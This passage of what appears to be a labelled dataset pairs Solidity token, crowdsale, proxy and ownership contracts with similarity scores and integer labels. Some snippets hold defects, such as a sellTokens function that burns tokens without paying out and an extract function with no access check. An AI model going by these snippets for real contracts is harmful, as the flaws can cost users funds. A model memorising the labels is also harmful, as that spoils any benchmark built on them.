      switch result

      case 0 { revert(ptr, size) }

      default { return(ptr, size) }

    }

  }

}",1,,,,,
"contract DappTokenSale {
address admin;
DappToken public tokenContract;
uint256 public tokenPrice;
uint256 public tokensSold;

event Sell(address _buyer, uint256 _amount);

constructor (DappToken _tokenContract, uint256 _tokenPrice) public {
    admin = msg.sender;
    tokenContract = _tokenContract;
    tokenPrice = _tokenPrice;
}

function multiply(uint x, uint y) internal pure returns (uint z) {
    require(y == 0 || (z = x * y) / y == x);
}

function buyTokens(uint256 _numberOfTokens) public payable {
    require(msg.value == multiply(_numberOfTokens, tokenPrice));
    require(tokenContract.balanceOf(address(this)) >= _numberOfTokens);
    require(tokenContract.transfer(msg.sender, _numberOfTokens));

    tokensSold += _numberOfTokens;

    emit Sell(msg.sender, _numberOfTokens);
}

function endSale() public {
    require(msg.sender == admin);
    require(tokenContract.transfer(admin, tokenContract.balanceOf(address(this))));


    admin.transfer(address(this).balance);
}",0.953424909,"contract CoinByInsomniaTokenSale {
    address admin;
    CoinByInsomnia public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;

    event Sell(address _buyer, uint256 _amount);

   constructor (CoinByInsomnia _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(uint256 _numberOfTokens) public payable {
        require(msg.value == multiply(_numberOfTokens, tokenPrice));
        require(tokenContract.balanceOf(this) >= _numberOfTokens);
        require(tokenContract.transfer(msg.sender, _numberOfTokens));

        tokensSold += _numberOfTokens;

        emit Sell(msg.sender, _numberOfTokens);
    }

    function endSale() public {
        require(msg.sender == admin);
        require(tokenContract.transfer(admin, tokenContract.balanceOf(this)));

        
        
        admin.transfer(address(this).balance);
    }
}",1,,,,,
"contract GenesisExchangeToken is StandardToken {

  string public constant name = ""GenesisExchangeToken"";
  string public constant symbol = ""GEX"";
  uint8 public constant decimals = 18;

  uint256 public constant INITIAL_SUPPLY = 10000 * (10 ** uint256(decimals));

  
  function GenesisExchangeToken() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }

}",0.990543806,"contract GenesisExchangeToken is StandardToken {

  string public constant name = ""GenesisExchangeToken"";
  string public constant symbol = ""GEX"";
  uint8 public constant decimals = 18;

  uint256 public constant INITIAL_SUPPLY = 100000000 * (10 ** uint256(decimals));

  
  function GenesisExchangeToken() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }

}",1,,,,,
"contract MyToken {function transfer(address _to, uint256 _value) public; }",0.911906985,"contract TokenERC20 {
  function transfer(address _to, uint256 _value) public;
}",1,,,,,
"contract Owned {

    address public owner;

    function Owned() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function setOwner(address _newOwner) onlyOwner {
        owner = _newOwner;
    }
}",0.939108487,"contract Owned {
	
    address public owner;

	
    function Owned() {
        owner = msg.sender;
    }
	
	
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

	
    function transferOwnership(address newOwner) onlyOwner {
        owner = newOwner;
    }
}",1,,,,,
"contract MichaelCoin {


  mapping (address => uint256) balances;
  mapping (address => mapping (address => uint256)) allowed;


  string public name = ""Michael Coin"";
  string public symbol = ""MC"";
  uint8 public decimals = 18;
  uint256 public totalAmount = 1000000;

  event Transfer (address indexed _from, address indexed _to, uint256 _value);
  event Approval (address indexed _owner, address indexed _spender, uint256 _value);

  function MichaelCoin() {
    
    balances[msg.sender] = totalAmount;
  }
  function totalSupply() constant returns(uint) {
    return totalAmount;
    }
  function transfer (address _to, uint256 _value) returns (bool success) {
    if (balances[msg.sender] >= _value
        && balances[_to] + _value > balances[_to]) {
      balances[msg.sender] -= _value;
      balances[_to] += _value;
      Transfer(msg.sender, _to, _value);
      return true;
    } else { return false; }
  }

  function transferFrom(address _from, address _to, uint _value) returns (bool success) {
    if(balances[_from] >= _value
        && _value > 0
        && balances[_to] + _value > balances[_to]
        && allowed[_from][msg.sender] >= _value) {

        balances[_from] -= _value;
        balances[_to] += _value;
        Transfer(_from, _to, _value);

        return true;
    }
    return false;
}

  function balanceOf(address _owner) constant returns (uint256 balance) {
    return balances[_owner];
  }

  function approve(address _spender, uint256 _value) returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
    return allowed[_owner][_spender];
  }

  function() {
    throw;
  }
}",0.900119387,"contract	Basic_Element_II				is	Ownable	{		
									
	string	public	constant	name =	""	Basel_II		""	;
	string	public	constant	symbol =	""	BASELII		""	;
	uint32	public	constant	decimals =		18			;
	uint	public		totalSupply =		0			;
									
	mapping (address => uint) balances;								
	mapping (address => mapping(address => uint)) allowed;								
									
	function mint(address _to, uint _value) onlyOwner {								
		assert(totalSupply + _value >= totalSupply && balances[_to] + _value >= balances[_to]);							
		balances[_to] += _value;							
		totalSupply += _value;							
	}								
									
	function balanceOf(address _owner) constant returns (uint balance) {								
		return balances[_owner];							
	}								
									
	function transfer(address _to, uint _value) returns (bool success) {								
		if(balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {							
			balances[msg.sender] -= _value; 						
			balances[_to] += _value;						
			return true;						
		}							
		return false;							
	}								
									
	function transferFrom(address _from, address _to, uint _value) returns (bool success) {								
		if( allowed[_from][msg.sender] >= _value &&							
			balances[_from] >= _value 						
			&& balances[_to] + _value >= balances[_to]) {						
			allowed[_from][msg.sender] -= _value;						
			balances[_from] -= _value;						
			balances[_to] += _value;						
			Transfer(_from, _to, _value);						
			return true;						
		}							
		return false;							
	}								
									
	function approve(address _spender, uint _value) returns (bool success) {								
		allowed[msg.sender][_spender] = _value;							
		Approval(msg.sender, _spender, _value);							
		return true;							
	}								
									
	function allowance(address _owner, address _spender) constant returns (uint remaining) {								
		return allowed[_owner][_spender];							
	}								
									
	event Transfer(address indexed _from, address indexed _to, uint _value);								
	event Approval(address indexed _owner, address indexed _spender, uint _value);								
}",3,,,,,
"contract TechnoBit is ERC20 {

    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;    

    string public constant name = ""Techno Bit"";
    string public constant symbol = ""TBIT"";
    uint public constant decimals = 8;

    uint256 public totalSupply = 10000000000e8;
    uint256 public totalDistributed =  1000000000e8;    
    uint256 public constant MIN_CONTRIBUTION = 1 ether / 100; 
    uint256 public tokensPerEth = 20000000e8;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    event Distr(address indexed to, uint256 amount);
    event DistrFinished();

    event Airdrop(address indexed _owner, uint _amount, uint _balance);

    event TokensPerEthUpdated(uint _tokensPerEth);

    event Burn(address indexed burner, uint256 value);

    bool public distributionFinished = false;

    modifier canDistr() {
        require(!distributionFinished);
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


    function TechnoBit () public {
        owner = msg.sender;    
        distr(owner, totalDistributed);
    }

    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }


    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);        
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);

        return true;
    }

    function doAirdrop(address _participant, uint _amount) internal {

        require( _amount > 0 );      

        require( totalDistributed < totalSupply );

        balances[_participant] = balances[_participant].add(_amount);
        totalDistributed = totalDistributed.add(_amount);

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }

        
        emit Airdrop(_participant, _amount, balances[_participant]);
        emit Transfer(address(0), _participant, _amount);
    }

    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        
        doAirdrop(_participant, _amount);
    }

    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        
        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);
    }

    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        
        tokensPerEth = _tokensPerEth;
        emit TokensPerEthUpdated(_tokensPerEth);
    }

    function () external payable {
        getTokens();
     }

    function getTokens() payable canDistr  public {
        uint256 tokens = 0;

        
        require( msg.value >= MIN_CONTRIBUTION );

        require( msg.value > 0 );

        
        tokens = tokensPerEth.mul(msg.value) / 1 ether;        
        address investor = msg.sender;

        if (tokens > 0) {
            distr(investor, tokens);
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }

    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }

    
    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[msg.sender]);

        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {

        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);

        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        ForeignToken t = ForeignToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }

    function withdraw() onlyOwner public {
        address myAddress = this;
        uint256 etherBalance = myAddress.balance;
        owner.transfer(etherBalance);
    }

    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);
        
        

        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {
        ForeignToken token = ForeignToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}",0.991216029,"contract WANGTOKEN is ERC20 {

    

    using SafeMath for uint256;

    address owner = msg.sender;



    mapping (address => uint256) balances;

    mapping (address => mapping (address => uint256)) allowed;    



    string public constant name = ""WANGTOKEN"";

    string public constant symbol = ""WANGTOKEN"";

    uint public constant decimals = 8;

    

    uint256 public totalSupply = 25000000000e8;

    uint256 public totalDistributed =  5000000000e8;    

    uint256 public constant MIN_CONTRIBUTION = 1 ether / 100; 

    uint256 public tokensPerEth = 50000000e8;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    

    event Distr(address indexed to, uint256 amount);

    event DistrFinished();



    event Airdrop(address indexed _owner, uint _amount, uint _balance);



    event TokensPerEthUpdated(uint _tokensPerEth);

    

    event Burn(address indexed burner, uint256 value);



    bool public distributionFinished = false;

    

    modifier canDistr() {

        require(!distributionFinished);

        _;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    

    function WANGTOKEN () public {

        owner = msg.sender;    

        distr(owner, totalDistributed);

    }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }

    



    function finishDistribution() onlyOwner canDistr public returns (bool) {

        distributionFinished = true;

        emit DistrFinished();

        return true;

    }

    

    function distr(address _to, uint256 _amount) canDistr private returns (bool) {

        totalDistributed = totalDistributed.add(_amount);        

        balances[_to] = balances[_to].add(_amount);

        emit Distr(_to, _amount);

        emit Transfer(address(0), _to, _amount);



        return true;

    }



    function doAirdrop(address _participant, uint _amount) internal {



        require( _amount > 0 );      



        require( totalDistributed < totalSupply );

        

        balances[_participant] = balances[_participant].add(_amount);

        totalDistributed = totalDistributed.add(_amount);



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }



        

        emit Airdrop(_participant, _amount, balances[_participant]);

        emit Transfer(address(0), _participant, _amount);

    }



    function adminClaimAirdrop(address _participant, uint _amount) public onlyOwner {        

        doAirdrop(_participant, _amount);

    }



    function adminClaimAirdropMultiple(address[] _addresses, uint _amount) public onlyOwner {        

        for (uint i = 0; i < _addresses.length; i++) doAirdrop(_addresses[i], _amount);

    }



    function updateTokensPerEth(uint _tokensPerEth) public onlyOwner {        

        tokensPerEth = _tokensPerEth;

        emit TokensPerEthUpdated(_tokensPerEth);

    }

           

    function () external payable {

        getTokens();

     }

    

    function getTokens() payable canDistr  public {

        uint256 tokens = 0;



        

        require( msg.value >= MIN_CONTRIBUTION );



        require( msg.value > 0 );



        

        tokens = tokensPerEth.mul(msg.value) / 1 ether;        

        address investor = msg.sender;

        

        if (tokens > 0) {

            distr(investor, tokens);

        }



        if (totalDistributed >= totalSupply) {

            distributionFinished = true;

        }

    }



    function balanceOf(address _owner) constant public returns (uint256) {

        return balances[_owner];

    }



    

    modifier onlyPayloadSize(uint size) {

        assert(msg.data.length >= size + 4);

        _;

    }

    

    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[msg.sender]);

        

        balances[msg.sender] = balances[msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(msg.sender, _to, _amount);

        return true;

    }

    

    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {



        require(_to != address(0));

        require(_amount <= balances[_from]);

        require(_amount <= allowed[_from][msg.sender]);

        

        balances[_from] = balances[_from].sub(_amount);

        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);

        balances[_to] = balances[_to].add(_amount);

        emit Transfer(_from, _to, _amount);

        return true;

    }

    

    function approve(address _spender, uint256 _value) public returns (bool success) {

        

        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }

    

    function allowance(address _owner, address _spender) constant public returns (uint256) {

        return allowed[_owner][_spender];

    }

    

    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){

        ForeignToken t = ForeignToken(tokenAddress);

        uint bal = t.balanceOf(who);

        return bal;

    }

    

    function withdraw() onlyOwner public {

        address myAddress = this;

        uint256 etherBalance = myAddress.balance;

        owner.transfer(etherBalance);

    }

    

    function burn(uint256 _value) onlyOwner public {

        require(_value <= balances[msg.sender]);

        

        



        address burner = msg.sender;

        balances[burner] = balances[burner].sub(_value);

        totalSupply = totalSupply.sub(_value);

        totalDistributed = totalDistributed.sub(_value);

        emit Burn(burner, _value);

    }

    

    function withdrawForeignTokens(address _tokenContract) onlyOwner public returns (bool) {

        ForeignToken token = ForeignToken(_tokenContract);

        uint256 amount = token.balanceOf(address(this));

        return token.transfer(owner, amount);

    }

}",1,,,,,
"contract Proxy {

    
    function () public payable {
        address _impl = implementation();
        require(_impl != address(0));
        bytes memory data = msg.data;

        assembly {
            let result := delegatecall(gas, _impl, add(data, 0x20), mload(data), 0, 0)
            let size := returndatasize

            let ptr := mload(0x40)
            returndatacopy(ptr, 0, size)

            switch result
            case 0 { revert(ptr, size) }
            default { return(ptr, size) }
        }
    }

    
    function implementation() public view returns (address);
}",0.909999734,"contract Proxy {

  

  function implementation() public view returns (address);



  

  function () payable public {

    address _impl = implementation();

    require(_impl != address(0));



    assembly {

      let ptr := mload(0x40)

      calldatacopy(ptr, 0, calldatasize)

      let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)

      let size := returndatasize

      returndatacopy(ptr, 0, size)



      switch result

      case 0 { revert(ptr, size) }

      default { return(ptr, size) }

    }

  }

}",,,,,,
"contract MyCoin {
    
    string public name = ""MyCoin"";
    string public symbol = ""XYZ"";
    uint8 public decimals = 18;
    
    uint256 public totalSupply;
    uint256 initialSupply = 50000000;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);

    
    constructor() public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[this] = totalSupply;                
        
        
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }


    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    
    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }
}",0.920992455,"contract HOWEOToken {

    string public name;

    string public symbol;

    uint8 public decimals = 18;

    uint256 public totalSupply;



    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    event Transfer(address indexed from, address indexed to, uint256 value);

    event Burn(address indexed from, uint256 value);



    function HOWEOToken() public {

        totalSupply = 300000000 * 10 ** uint256(decimals);

        balanceOf[msg.sender] = totalSupply;

        name = ""HOWEO"";

        symbol = ""XVN"";

    }



    function _transfer(address _from, address _to, uint _value) internal {

        require(_to != 0x0);

        require(balanceOf[_from] >= _value);

        require(balanceOf[_to] + _value > balanceOf[_to]);

        uint previousBalances = balanceOf[_from] + balanceOf[_to];

        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;

        Transfer(_from, _to, _value);

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

    }



    function transfer(address _to, uint256 _value) public {

        _transfer(msg.sender, _to, _value);

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= allowance[_from][msg.sender]);     

        allowance[_from][msg.sender] -= _value;

        _transfer(_from, _to, _value);

        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        return true;

    }



    function burn(uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);   

        balanceOf[msg.sender] -= _value;            

        totalSupply -= _value;                      

        Burn(msg.sender, _value);

        return true;

    }



    function burnFrom(address _from, uint256 _value) public returns (bool success) {

        require(balanceOf[_from] >= _value);                

        require(_value <= allowance[_from][msg.sender]);    

        balanceOf[_from] -= _value;                         

        allowance[_from][msg.sender] -= _value;             

        totalSupply -= _value;                              

        Burn(_from, _value);

        return true;

    }

}",3,,,,,
"contract Crowdsale is BurnableToken {
  using SafeMath for uint256;
  using SafeERC20 for ERC20;

  
  ERC20 public token;

  
  address public wallet;

  
  
  
  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(
    address indexed purchaser,
    address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(uint256 _rate, address _wallet, ERC20 _token) public {
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    rate = _rate;
    wallet = _wallet;
    token = _token;
  }

  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address _beneficiary) public payable {

    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(
      msg.sender,
      _beneficiary,
      weiAmount,
      tokens
    );

    _updatePurchasingState(_beneficiary, weiAmount);

    _forwardFunds();
    _postValidatePurchase(_beneficiary, weiAmount);
  }

  function sellTokens(uint256 amount) public {

    uint256 weiAmount = amount.mul(rate);
    address myAddress = address(this);

    require(myAddress.balance >= weiAmount);
    weiRaised = weiRaised.sub(weiAmount);

    burn(amount);

  }

  
  
  

  
  function _preValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);
  }

  
  function _postValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    token.safeTransfer(_beneficiary, _tokenAmount);
  }

  
  function _processPurchase(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _getTokenAmount(uint256 _weiAmount)
    internal view returns (uint256)
  {
    return _weiAmount.mul(rate);
  }

  
  function _forwardFunds() internal {
    wallet.transfer(msg.value);
  }
}",0.922158445,"contract Sale is Ownable {
  using SafeMath for uint256;

  ERC20 public token;
  address public wallet;
  uint256 public rate;
  uint256 public weiRaised;

  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

  function Sale (uint256 _rate, address _wallet, ERC20 _token) public {
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    rate = _rate;
    wallet = _wallet;
    token = _token; }

  function () external payable {
    buyTokens(msg.sender);}


  function buyTokens(address _beneficiary) public payable {
    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);
    uint256 tokens = _getTokenAmount(weiAmount);
    weiRaised = weiRaised.add(weiAmount);
    _processPurchase(_beneficiary, tokens);
    TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);
    _updatePurchasingState(_beneficiary, weiAmount);
    _forwardFunds();
    _postValidatePurchase(_beneficiary, weiAmount); }

  function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
    require(_beneficiary != address(0));
    require(_weiAmount != 0); }

  function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal { }

  function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
    token.transfer(_beneficiary, _tokenAmount); }

  function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {
    _deliverTokens(_beneficiary, _tokenAmount); }

  function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal { }

  function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {
    return _weiAmount.mul(rate); }

  function _forwardFunds() internal {
    wallet.transfer(msg.value); }
   

  function TokenDestructible() public payable { }
  function destroy(address[] tokens) onlyOwner public {


    for (uint256 i = 0; i < tokens.length; i++) {
      ERC20Basic token = ERC20Basic(tokens[i]);
      uint256 balance = token.balanceOf(this);
      token.transfer(owner, balance);} 
    selfdestruct(owner); }}",3,,,,,
"contract ERC223ReceivingContract { 
    
    function tokenFallback(address _from, uint256 _value, bytes memory _data) public;
}",0.96740582,"contract ERC223ReceivingContract {

    function tokenFallback(address _from, uint _value, bytes memory _data) public;

}",0,,,,,
"contract Ownable {

    address public owner;

    
    function Ownable() internal {
        owner = msg.sender;
    }

    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

}",0.944463281,"contract Ownable {
  address public owner;

  
  function Ownable() public {
    owner = msg.sender;
  }

  
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

 

}",0,,,,,
"contract AjToken {
string  public name = ""AJ Token"";
string  public symbol = ""AJ"";
string  public standard = ""AJ Token V1.0 standard"";
uint256 public totalSupply;

event Transfer(
    address indexed _from,
    address indexed _to,
    uint256 _value
);

event Approval(
    address indexed _owner,
    address indexed _spender,
    uint256 _value
);

mapping(address => uint256) public balanceOf;
mapping(address => mapping(address => uint256)) public allowance;

function AjToken (uint256 _initialSupply) public {
    balanceOf[msg.sender] = _initialSupply;
    totalSupply = _initialSupply;
}

function transfer(address _to, uint256 _value) public returns (bool success) {
    require(balanceOf[msg.sender] >= _value);

    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;

    Transfer(msg.sender, _to, _value);

    return true;
}

function approve(address _spender, uint256 _value) public returns (bool success) {
    allowance[msg.sender][_spender] = _value;

    Approval(msg.sender, _spender, _value);

    return true;
}

function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= balanceOf[_from]);
    require(_value <= allowance[_from][msg.sender]);

    balanceOf[_from] -= _value;
    balanceOf[_to] += _value;

    allowance[_from][msg.sender] -= _value;

    

    


    Transfer(_from, _to, _value);

    return true;
}
}",0.973452667,"contract DappToken {

    string  public name = ""Utopia Credits"";

    string  public symbol = ""UTOC"";

    string  public standard = ""DApp Token v1.0"";

    uint256 public totalSupply;



    event Transfer(

        address indexed _from,

        address indexed _to,

        uint256 _value

    );



    event Approval(

        address indexed _owner,

        address indexed _spender,

        uint256 _value

    );



    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;



    function DappToken (uint256 _initialSupply) public {

        balanceOf[msg.sender] = _initialSupply;

        totalSupply = _initialSupply;

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);



        balanceOf[msg.sender] -= _value;

        balanceOf[_to] += _value;



        Transfer(msg.sender, _to, _value);



        return true;

    }



    function approve(address _spender, uint256 _value) public returns (bool success) {

        allowance[msg.sender][_spender] = _value;



        Approval(msg.sender, _spender, _value);



        return true;

    }



    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= balanceOf[_from]);

        require(_value <= allowance[_from][msg.sender]);



        balanceOf[_from] -= _value;

        balanceOf[_to] += _value;



        allowance[_from][msg.sender] -= _value;



        Transfer(_from, _to, _value);



        return true;

    }

}",1,,,,,
"contract SimpleStorage {
    uint storedData;

    function set(uint x) public {
        storedData = x;
    }

    function get() public constant returns (uint) {
        return storedData;
    } }",0.908076258,"contract SimpleStorage {
    uint storedData;

    function set(uint x) {
        storedData = x;
    }

    function get() constant returns (uint storedData) {
        return storedData;
    }
}",2,,,,,
"contract Moderated {

        address public moderator;

        bool public unrestricted;

        modifier onlyModerator {
            require(msg.sender == moderator);
            _;
        }

        modifier ifUnrestricted {
            require(unrestricted);
            _;
        }

        modifier onlyPayloadSize(uint numWords) {
            assert(msg.data.length >= numWords * 32 + 4);
            _;
        }

        function Moderated() public {
            moderator = msg.sender;
            unrestricted = true;
        }

        function reassignModerator(address newModerator) public onlyModerator {
            moderator = newModerator;
        }

        function restrict() public onlyModerator {
            unrestricted = false;
        }

        function unrestrict() public onlyModerator {
            unrestricted = true;
        }

        
        
        function extract(address _token) public returns (bool) {
            require(_token != address(0x0));
            Token token = Token(_token);
            uint256 balance = token.balanceOf(this);
            return token.transfer(moderator, balance);
        }

        function isContract(address _addr) internal view returns (bool) {
            uint256 size;
            assembly { size := extcodesize(_addr) }
            return (size > 0);
        }
    }",0.995648313,"contract Moderated {
    
    address public moderator;
    
    bool public unrestricted;
    
    modifier onlyModerator {
        require(msg.sender == moderator);
        _;
    }
    
    modifier ifUnrestricted {
        require(unrestricted);
        _;
    }
    
    modifier onlyPayloadSize(uint256 numWords) {
        assert(msg.data.length >= numWords * 32 + 4);
        _;
    }    
    
    function Moderated() public {
        moderator = msg.sender;
        unrestricted = true;
    }
    
    function reassignModerator(address newModerator) public onlyModerator {
        moderator = newModerator;
    }
    
    function restrict() public onlyModerator {
        unrestricted = false;
    }
    
    function unrestrict() public onlyModerator {
        unrestricted = true;
    }  
    
    
    
    function extract(address _token) public returns (bool) {
        require(_token != address(0x0));
        Token token = Token(_token);
        uint256 balance = token.balanceOf(this);
        return token.transfer(moderator, balance);
    }
    
    function isContract(address _addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(_addr) }
        return (size > 0);
    }    
}",0,,,,,
"contract Token {

        function totalSupply() public view returns (uint256);
        function balanceOf(address who) public view returns (uint256);
        function transfer(address to, uint256 value) public returns (bool);
        function transferFrom(address from, address to, uint256 value) public returns (bool);
        function approve(address spender, uint256 value) public returns (bool);
        function allowance(address owner, address spender) public view returns (uint256);
        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(address indexed owner, address indexed spender, uint256 value);

 }",0.984061872,"contract ERC20 {

  function totalSupply() public view returns (uint256);

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  function allowance(address owner, address spender)

    public view returns (uint256);



  function transferFrom(address from, address to, uint256 value)

    public returns (bool);



  function approve(address spender, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(

    address indexed owner,

    address indexed spender,

    uint256 value

  );

}",0,,,,,
"contract Token {
    string internal _symbol;
    string internal _name;
    uint8 internal _decimals;
